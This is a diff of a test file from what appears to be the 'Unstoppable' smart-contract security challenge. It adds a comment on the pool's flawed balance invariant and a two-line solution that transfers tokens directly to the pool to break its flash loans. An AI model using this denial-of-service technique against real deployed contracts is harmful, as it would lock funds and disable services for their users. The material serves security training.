@@ -42,8 +42,20 @@ describe('[Challenge] Unstoppable', function () {
         await this.receiverContract.executeFlashLoan(10);
     });
 
+    /**
+     *  Overview of Exploit
+     * 
+     *  Since the lending pool requires
+     *         assert(poolBalance == balanceBefore);
+     *  Once is calculated at runtime with token.balanceOf() 
+     *  The other is stored and updated through the depositTokens() function
+     * 
+     *  Simply transferring tokens to the contract outside of that function
+     *  makes them out of sync and hence bricking the contract.
+     */
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        
         const attackTokenContract = this.token.connect(attacker);
         await attackTokenContract.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
     });
